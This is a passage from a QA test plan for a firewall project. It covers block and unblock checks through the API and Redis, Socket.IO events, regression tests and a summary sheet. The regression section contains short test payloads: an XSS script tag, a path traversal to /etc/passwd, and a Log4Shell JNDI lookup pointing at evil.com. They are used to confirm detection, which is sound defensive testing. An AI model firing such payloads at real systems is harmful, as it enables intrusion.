| 9.4.1 | JWT-ALG-NONE-001 fires | Detection with `Category: "jwt-alg-none"` and `Severity: CRITICAL` appears in logs | `[ ]` |

### 9.5 Block → Redis Cache → Enforcement

```bash
# 1. Create manual block via API
BLOCK=$(curl -s -X POST http://localhost:5000/api/admin/blocked \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"targetType":"ip","targetValue":"'"$ATTACKER_IP"'","reason":"e2e test","action":"block"}')
echo $BLOCK | python3 -m json.tool

# 2. Verify Redis cache
redis-cli -n 2 EXISTS gate:blocked:$ATTACKER_IP

# 3. Unblock
BLOCK_ID=$(echo $BLOCK | python3 -c "import sys,json; print(json.load(sys.stdin)['_id'])")
curl -s -X PATCH http://localhost:5000/api/admin/blocked/$BLOCK_ID/unblock \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{}'

# 4. Verify cache cleared
redis-cli -n 2 EXISTS gate:blocked:$ATTACKER_IP
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 9.5.1 | Block created in MongoDB | `status: "active"` in response | `[ ]` |
| 9.5.2 | Redis cache populated immediately | `EXISTS gate:blocked:$IP` → `1` | `[ ]` |
| 9.5.3 | After unblock: MongoDB status | `status: "unblocked"` | `[ ]` |
| 9.5.4 | After unblock: Redis cache cleared | `EXISTS gate:blocked:$IP` → `0` | `[ ]` |

### 9.6 Socket.IO Live Events

> Open browser dev console on the dashboard page, run:
```javascript
// In browser console after connecting to dashboard
window._testSocket = io('http://localhost:5000');
window._testSocket.on('block:new', d => console.log('BLOCK NEW:', d));
window._testSocket.on('block:removed', d => console.log('BLOCK REMOVED:', d));
```
Then create and unblock via the API in another terminal.

| # | Check | Expected | Pass? |
|---|---|---|---|
| 9.6.1 | `block:new` event fires on create | Event logged in console within 1s | `[ ]` |
| 9.6.2 | `block:removed` event fires on unblock | Event logged in console within 1s | `[ ]` |

---

## 10. Regression — Existing Functionality Not Broken

> Verify that the Phase A–D changes did not break any previously passing functionality.

### 10.1 Go Proxy Existing Detection Still Works

| # | Check | Command | Expected | Pass? |
|---|---|---|---|---|
| 10.1.1 | XSS still detected | `curl "http://$PROXY_HOST:$PORT/?q=<script>alert(1)</script>"` | `CatXSS` Detection fires | `[ ]` |
| 10.1.2 | Path traversal detected | `curl "http://$PROXY_HOST:$PORT/../../../etc/passwd"` | `CatPathTraversal` fires | `[ ]` |
| 10.1.3 | Log4Shell detected | `curl -H "X-Api-Version: \${jndi:ldap://evil.com/a}" http://$PROXY_HOST:$PORT/` | `CatLog4Shell` fires | `[ ]` |
| 10.1.4 | SSH analyzer still works | Connect SSH through proxy port | `CatSSHVersion` or similar emitted | `[ ]` |
| 10.1.5 | DNS analyzer still works | DNS query through proxy | `CatDNSTunnel` checks pass | `[ ]` |

### 10.2 Existing Backend Routes Unaffected

```bash
curl -s http://localhost:5000/api/threats -H "Authorization: Bearer $TOKEN" -w "\n%{http_code}"
curl -s http://localhost:5000/api/network -H "Authorization: Bearer $TOKEN" -w "\n%{http_code}"
curl -s http://localhost:5000/api/dashboard -H "Authorization: Bearer $TOKEN" -w "\n%{http_code}"
curl -s http://localhost:5000/api/logs -H "Authorization: Bearer $TOKEN" -w "\n%{http_code}"
```

| # | Route | Expected | Pass? |
|---|---|---|---|
| 10.2.1 | `/api/threats` | HTTP 200 | `[ ]` |
| 10.2.2 | `/api/network` | HTTP 200 | `[ ]` |
| 10.2.3 | `/api/dashboard` | HTTP 200 | `[ ]` |
| 10.2.4 | `/api/logs` | HTTP 200 | `[ ]` |
| 10.2.5 | `/api/analytics` | HTTP 200 | `[ ]` |
| 10.2.6 | `/api/admin` (existing) | HTTP 200 | `[ ]` |

### 10.3 AdminThreshold — Existing Config Records Not Corrupted

```bash
cd Web/backend && node -e "
const mongoose = require('mongoose');
const AT = require('./src/models/AdminThreshold');
mongoose.connect(process.env.MONGO_URI || 'mongodb://localhost:27017/ngfw');
AT.find({}).then(docs => {
  docs.forEach(d => console.log('feature:', d.feature, '| config keys:', Object.keys(d.config || {})));
  mongoose.disconnect();
});
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 10.3.1 | Existing documents load | No errors, existing `feature` records listed | `[ ]` |
| 10.3.2 | `config` field intact | Existing config data not lost | `[ ]` |
| 10.3.3 | New optional fields default correctly | New documents get `autoBlockEnabled: true` etc. by default | `[ ]` |

---

## 11. Test Summary Sheet

> Fill this in after completing all sections above.

| Section | Total Tests | Passed | Failed | Skipped | Status |
|---|---|---|---|---|---|
| 1. Pre-flight | 11 | | | | |
| 2. Redis Security Client | 13 | | | | |
| 3. Go Detection Engine | 23 | | | | |
| 4. CAPTCHA Gate | 12 | | | | |
| 5. Block/Unblock Pipeline | 17 | | | | |
| 6. Python Feature Encoder | 9 | | | | |
| 7. ML Scoring Service | 9 | | | | |
| 8. Sandbox | 10 | | | | |
| 9. End-to-End | 12 | | | | |
| 10. Regression | 11 | | | | |
| **TOTAL** | **127** | | | | |

### Pass Criteria

| Threshold | Meaning |
|---|---|
| 127/127 ✅ | Full pass — safe to merge to main |
| ≥ 115/127 (≥ 90%) | Acceptable — document failed tests as known issues in PR |
| < 115 | Do not merge — investigate failures first |

### Known Limitations (Runtime-Dependent Tests)

The following tests require infrastructure not always available in CI:

- **3.2.1–3.2.6** (JWT tests) — require the Go proxy running in Integrated Mode
- **3.3.1–3.3.5** (BOLA tests) — require live proxy
- **7.3.1** (50ms timeout) — latency-sensitive, may vary
- **8.4.1–8.4.3** (Docker sandbox) — require Docker daemon
- **9.x** (End-to-end) — require full stack running

These may be marked `[ s ]` (skipped) in CI and tested manually before merge.

---

### Sign-off

| Role | Name | Date | Signature |
|---|---|---|---|
| Developer | | | |
| Reviewer | | | |
| QA | | | |
